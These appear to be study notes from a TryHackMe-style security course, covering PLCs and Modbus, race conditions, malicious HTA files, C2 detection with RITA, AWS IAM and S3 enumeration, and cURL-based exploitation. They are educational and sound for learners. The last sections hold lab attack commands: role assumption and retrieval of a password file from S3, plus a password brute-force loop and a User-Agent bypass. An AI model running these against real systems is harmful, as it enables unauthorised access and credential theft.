A PLC (Programmable Logic Controller) is an industrial computer designed to control machinery and processes in real-world environments. Unlike your laptop or smartphone, PLCs are purpose-built machines engineered for extreme reliability and harsh conditions.

PLCs are designed to:

- **Survive harsh environments** - They operate flawlessly in extreme temperatures, constant vibration, dust, moisture, and electromagnetic interference. A PLC controlling warehouse robotics might endure freezing temperatures in winter storage areas and scorching heat near packaging machinery.
- **Run continuously without failure** - PLCs operate 24/7 for years, sometimes decades, without rebooting. Industrial facilities can't afford downtime for software updates or system restarts. When a PLC starts running, it's expected to keep running indefinitely.
- **Execute control logic in real-time** - PLCs respond to sensor inputs within milliseconds. When a package reaches the end of a conveyor belt, the PLC must instantly activate the robotic arm to catch it. These timing requirements are critical for safety and efficiency.
- **Interface directly with physical hardware** - PLCs connect directly to sensors (measuring temperature, pressure, position, weight) and actuators (motors, valves, switches, robotic arms). They speak the electrical language of industrial machinery.

## What is Modbus?

Modbus is the communication protocol that industrial devices use to talk to each other. Created in 1979 by Modicon (now Schneider Electric), it's one of the oldest and most widely deployed industrial protocols in the world. Its longevity isn't due to sophisticated features—quite the opposite. Modbus succeeded because it's simple, reliable, and works with almost any device.

Think of Modbus as a basic request-response conversation:

- **Client** (your computer): "PLC, what's the current value of register 0?"
- **Server** (the PLC): "Register 0 currently holds the value 1."

This simplicity makes Modbus easy to implement and debug, but it also means security was never a consideration. There's no authentication, no encryption, no authorisation checking. Anyone who can reach the Modbus port can read or write any value.

## Modbus Data Types

Modbus organises data into four distinct types, each serving a specific purpose in industrial automation:

|         Type          |          Purpose           | Values  |                 Example Use Cases                 |
| :-------------------: | :------------------------: | :-----: | :-----------------------------------------------: |
|       **Coils**       |  Digital outputs (on/off)  | 0 or 1  |     Motor running? Valve open? Alarm active?      |
|  **Discrete Inputs**  |  Digital inputs (on/off)   | 0 or 1  |  Button pressed? Door closed? Sensor triggered?   |
| **Holding Registers** | Analogue outputs (numbers) | 0-65535 | Temperature setpoint, motor speed, zone selection |
|  **Input Registers**  | Analogue inputs (numbers)  | 0-65535 | Current temperature, pressure reading, flow rate  |

The distinction between inputs and outputs is important. **Coils** and **Holding Registers** are writable—you can change their values to control the system. **Discrete Inputs** and **Input Registers** are read-only—they reflect sensor measurements that you observe but cannot directly modify.

https://tryhackme.com/room/industrial-intrusion

# Day 20. Race Conditions - Toy to The World

## Race Condition

A race condition happens when two or more actions occur at the same time, and the system’s outcome depends on the order in which they finish. In web applications, this often happens when multiple users or automated requests simultaneously access or modify shared resources, such as inventory or account balances. If proper synchronisation isn’t in place, this can lead to unexpected results, such as duplicate transactions, oversold items, or unauthorised data changes.

## Types of Race Conditions

Generally, race condition attacks can be divided into three categories:

- **Time-of-Check to Time-of-Use (TOCTOU)**: A TOCTOU race condition happens when a program checks something first and uses it later, but the data changes in between. This means what was true at the time of the check might no longer be true when the action happens. It’s like checking if a toy is in stock, and by the time you click "**Buy**" someone else has already bought it. For example, two users buy the same "last item" at the same time because the stock was checked before it was updated.
- **Shared resource**: This occurs when multiple users or systems try to change the same data simultaneously without proper control. Since both updates happen together, the final result depends on which one finishes last, creating confusion. Think of two cashiers updating the same inventory spreadsheet at once, and one overwrites the other’s work.
- **Atomicity violation**: An atomic operation should happen all at once, either fully done or not at all. When parts of a process run separately, another request can sneak in between and cause inconsistent results. It’s like paying for an item, but before the system confirms it, someone else changes the price. For example, a payment is recorded, but the order confirmation fails because another request interrupts the process.

https://tryhackme.com/room/raceconditionsattacks

# Day 21. Malware Analysis - Malhare.exe

Ref - https://tryhackme.com/room/maldoc

## HTA Overview

An HTA (HTML Application) file is like a small desktop app built using familiar web technologies such as HTML, CSS, and JavaScript. Unlike regular web pages that open inside a browser, HTA files run directly on Windows through a built-in component called Microsoft HTML Application Host - `mshta.exe` process. This allows them to look and behave like lightweight programs with their own interfaces and actions. In legitimate use cases, HTA files serve several practical purposes in Wareville and beyond:

- Automating administrative or setup tasks.
- Providing quick interfaces for internal scripts.
- Testing small prototypes without building full software.
- Offering lightweight IT support utilities for daily use.

## HTA File Structure

An HTA file usually contains three main parts:

1. **The HTA declaration**: This defines the file as an HTML Application and can include basic properties like title, window size, and behaviour.
2. **The interface (HTML and CSS)**: This section creates the layout and visuals, such as buttons, forms, or text.
3. **The script (VBScript or JavaScript)**: Here is where the logic lives; it defines what actions the HTA will perform when opened or when a user interacts with it.


**Common purposes of malicious HTA use:**

- **Initial access/delivery**: HTA files are often delivered by phishing (email attachments, fake web pages, or downloads) and run via `mshta.exe`.
- **Downloaders/droppers**: An HTA can execute a script that fetches additional binaries or scripts from the attacker's C2.
- **Obfuscation/evasion:** HTAs can hide intent by embedding encoded data(Base64), by using short VBScript/JScript fragments, or by launching processes with hidden windows.
- **Living-off-the-land**: HTA commonly calls built-in Windows tools (`mshta.exe`, `powershell.exe`, `wscript.exe`, `rundll32.exe`) to avoid adding new binaries to disk.

# Day 22. C2 Detection - Command & Carol

## The Magic of RITA

Real Intelligence Threat Analytics (RITA) is an open-source framework created by Active Countermeasures. Its core functionality is to detect command and control (C2) communication by analyzing network traffic captures and logs. Its primary features are:

- C2 beacon detection
- DNS tunneling detection
- Long connection detection
- Data exfiltration detection
- Checking threat intel feeds
- Score connections by severity
- Show the number of hosts communicating with a specific external IP
- Shows the datetime when the external host was first seen on the network

Based on the normalized and correlated dataset, RITA runs several analysis modules collecting information like:

- Periodic connection intervals
- Excessive number of DNS queries
- Long FQDN
- Random subdomains
- Volume of data over time over HTTPS, DNS, or non-standard ports
- Self-signed or short-lived certificates
- Known malicious IPs by cross-referencing with public threat intel feeds or blocklists

RITA only accepts network traffic input as **Zeek** logs. **Zeek** is an open-source **network security monitoring (NSM)** tool. Zeek is not a firewall or IPS/IDS; it does not use signatures or specific rules to take an action. It simply observes network traffic via configured SPAN ports (used to copy traffic from one port to another for monitoring), physical network taps, or imported packet captures in the PCAP format. Zeek then analyzes and converts this input into a structured, enriched output. This output can be used in incident detection and response, as well as threat hunting. Out of the box, Zeek covers two of the four types of NSM data: transaction data (summarized records of application-layer transactions) and extracted content data (files or artifacts extracted, such as executables).

Ref - https://malware-traffic-analysis.net/, https://docs.zeek.org/en/master/logs/index.html

**RITA Details pane**  
Apart from the Source and Destination, we have two information categories: Threat Modifiers and Connection info. Let's have a closer look at these categories:

_Threat Modifiers_  
These are criteria to determine the severity and likelihood of a potential threat. The following modifiers are available:

- **MIME type/URI mismatch:** Flags connections where the MIME type reported in the HTTP header doesn't match the URI. This can indicate an attacker is trying to trick the browser or a security tool.
- **Rare signature:** Points to unusual patterns that attackers might overlook, such as a unique user agent string that is not seen in any other connections on the network.
- **Prevalence:** Analyzes the number of internal hosts communicating with a specific external host. A low percentage of internal hosts communicating with an external one can be suspicious.
- **First Seen:** Checks the date an external host was first observed on the network. A new host on the network is more likely to be a potential threat.
- **Missing host header:** Identifies HTTP connections that are missing the host header, which is often an oversight by attackers or a sign of a misconfigured system.
- **Large amount of outgoing data**: Flags connections that send a very large amount of data out from the network.
- **No direct connections:** Flags connections that don't have any direct connections, which can be a sign of a more complex or hidden command and control communication.

_Connection Info_  
Here, we can find the connections' metadata and basic connection info like:

- Connection count: Shows the number of connections initiated between the source and destination. A very high number can be an indicator of C2 beacon activity.
- Total bytes sent: Displays the total amount of bytes sent from source to destination. If this is a very high number, it could be an indication of data exfiltration.
- Port number - Protocol - Service: If the port number is non-standard, it warrants further investigation. The lack of SSL in the Service info could also be an indicator that warrants further investigation.

# Day 23. AWS Security - S3cret Santa

## IAM: Users, Roles, Groups and Policies

### IAM Overview

Amazon Web Services utilises the Identity and Access Management (IAM) service to manage users and their access to various resources, including the actions that can be performed against those resources. Therefore, it is crucial to ensure that the correct access is assigned to each user according to the requirements. Misconfiguring IAM has led to several high-profile security incidents in the past, giving attackers access to resources they were not supposed to access. Companies like Toyota, Accenture and Verizon have been victims of such attacks in the past, often exposing customer data or sensitive documents.

### IAM Users

A user represents a single identity in AWS. Each user has a set of credentials, such as passwords or access keys, that can be used to access resources. Furthermore, permissions can be granted at a user level, defining the level of access a user might have.

### IAM Groups

Multiple users can be combined into a group. This can be done to ease the access management for multiple users. For example, in an organisation employing hundreds of thousands of people, there might be a handful of people who need write access to a certain database. Instead of granting access to each user individually, the admin can grant access to a group and add all users who require write access to that group. When a user no longer needs access, they can be removed from the group.

### IAM Roles

An IAM Role is a temporary identity that can be assumed by a user, as well as by services or external accounts, to get certain permissions.

### IAM Policies

Access provided to any user, group or role is controlled through IAM policies. A policy is a JSON document that defines the following:

- What action is allowed (Action)
- On which resources (Resource)
- Under which conditions (Condition)
- For whom (Principal)

**Enumerating Users** - 
- `aws iam list-users`

**Enumerating User Policies** - 
- `aws iam list-user-policies --user-name sir.carrotbane`
- `aws iam list-attached-user-policies --user-name sir.carrotbane`
- `aws iam list-groups-for-user --user-name sir.carrotbane`
- `aws iam get-user-policy --policy-name POLICYNAME --user-name sir.carrotbane`

**Enumerating Roles** - 
- `aws iam list-roles`
- `aws iam list-role-policies --role-name bucketmaster`
- `aws iam list-attached-role-policies --role-name bucketmaster`
- `aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy`

**Assuming Role** - 
- `aws sts assume-role --role-arn arn:aws:iam::123456789012:role/bucketmaster --role-session-name TBFC`

## What Is S3?

Amazon S3 stands for **Simple Storage Service**. It is an object storage service provided by Amazon Web Services that can store any type of object such as images, documents, logs and backup files. Companies often use S3 to store data for various reasons, such as reference images for their website, documents to be shared with clients, or files used by internal services for internal processing. Any object you store in S3 will be put into a "Bucket". You can think of a bucket as a directory where you can store files, but in the cloud.

**Listing Contents From a Bucket** - 
- `aws s3api list-buckets`
- `aws s3api list-objects --bucket easter-secrets-123145`
- `aws s3api get-object --bucket easter-secrets-123145 --key cloud_password.txt cloud_password.txt`

# Day 24. Exploitation with cURL - Hoperation Eggsploit

**HTTP Requests Using cURL** -
- Applications, like our browsers, communicate with servers using HTTP (Hypertext Transfer Protocol). Think of HTTP as the language for asking a server for resources (pages, images, JSON data) and getting answers back. So if you want to access a website, your browser sends an **HTTP request** to the web server. If the request is valid, the server replies with an **HTTP response** that contains the data needed to display the website. In the absence of a browser, you can still speak HTTP directly from the command line. The simplest way is with cURL. `curl` is a command-line tool for crafting HTTP requests and viewing raw responses. It's ideal when you need precision or when GUI tools aren't available.

**Trying out cURL** -
- `curl http://MACHINE_IP/'

**Sending POST Requests** -
- `curl -X POST -d "username=user&password=user" http://MACHINE_IP/post.php`
- `-X POST` tells cURL to use the POST method.
- `-d` defines the data we're sending in the body of the request.

If the application expects additional fields, like a "Login" button or a CSRF token, they can be included too :
- `curl -X POST -d "username=user&password=user&submit=Login" http://MACHINE_IP/post.php`

**Using Cookies and Sessions** - 
- `curl -c cookies.txt -d "username=admin&password=admin" http://10.80.178.237/session.php`
- The `-c` option writes any cookies received from the server into a file (`cookies.txt` in this case).
- You'll often see a session cookie like `PHPSESSID=xyz123`.
- `curl -b cookies.txt http://10.80.178.237/session.php`
- The `-b` option tells cURL to send the saved cookies in the next request, just like a browser would.

Bruteforcing Password - 
```sh
for pass in $(cat passwords.txt); do
  echo "Trying password: $pass"
  response=$(curl -s -X POST -d "username=admin&password=$pass" http://10.80.178.237/bruteforce.php)
  if echo "$response" | grep -q "Welcome"; then
    echo "[+] Password found: $pass"
    break
  fi
done
```

**Bypassing User-Agent Checks** - 
- `curl -A "internalcomputer" http://10.80.178.237/ua_check.php`
- 